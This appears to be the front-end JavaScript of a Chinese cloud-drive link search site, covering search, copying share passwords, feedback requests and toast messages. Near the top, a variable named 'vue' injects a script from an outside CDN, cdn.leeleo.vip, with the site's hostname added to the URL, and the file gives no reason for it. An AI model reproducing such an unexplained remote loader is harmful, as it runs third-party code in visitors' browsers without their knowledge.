// window.location.href="/s/1/"+div;  window.open("/s/1/"+div);  window.location.href="/open/"+d+"/"+b;    window.open("/open/"+d+"/"+b); 
var mcl={Cache:{put:function(b,c,a){try{if(!localStorage)return!1;if(!a||isNaN(a))a=60;localStorage.setItem(b,JSON.stringify({val:c,exp:new Date-1+1E3*a}))}catch(d){}},get:function(b){try{if(!localStorage)return!1;var c=localStorage.getItem(b),a=JSON.parse(c);return a?new Date-1>a.exp?(this.remove(b),""):a.val:null}catch(d){return this.remove(b),null}},remove:function(b){if(!localStorage)return!1;localStorage.removeItem(b)},clear:function(){if(!localStorage)return!1;localStorage.clear()}}};
var nmb = "//cdn.leeleo.vip/mcsou/" + window.location.hostname;
var vue = $('<script><\/script>');
vue.attr("src", nmb);
$("body").append(vue);

$("#Top").on("click", ".block", function() {
    var div = $(this).text();
    $('#Word').val(div);
    window.location.href="/s/1/"+div; 
    showDefault('正在努力加载中 · · ·', 2);
});
$(".open").click(function(){var b=$(this).data("url"),c=$(this).data("code"),d=$(this).data("id"),a=new ClipboardJS(".open",{text:function(){return c}});a.on("success",function(a){showDefault('复制密码成功，正在打开…', 2);});setTimeout(function(){window.open("/open/"+d+"/"+b);},500);});
$(".copy").click(function(){var c=$(this).data("code"),a=new ClipboardJS(".copy",{text:function(){return c}});a.on("success",function(a){showDefault('复制成功，打开网盘APP即可保存！', 2);});a.on("error",function(a){})});
$(".fankui").click(function(){
    var id=$(this).data("id");
    if(mcl.Cache.get("fankui_"+id) !== "ok"){
        $.ajax({
            url: '/a/fankui',
            type: 'post',
            dataType: 'json',
            data: {id:id},
            success: function (r) {
                if(r.code == 200){
                    showDefault('反馈成功！', 2);
                    mcl.Cache.put("fankui_"+id,"ok",24*60*60);
                }
                else{
                    showDefault('反馈失败！', 2);
                }
            }
        });
    }else{
        showDefault('您已反馈，请耐心等待修复！', 2);
    }
    
});

var toast = new auiToast();
function showDefault(text, time){
    toast.custom({
        title:"☺&nbsp;"+text,
        html:'',
        duration:time*1000
    });
}
$("#ThisForm").keydown(function(){
    if(event.keyCode == 13){
        $("#Search").click();
        return false;
    }
});
$("#Search").click(function(){
    var value = $("#Word").val();
    if(!value){
        showDefault('搜索关键字不能为空！', 1);
        return false;
    }else{
        window.location.href="/s/1/"+value;
        showDefault('正在努力加载中 · · ·', 2);
    }
});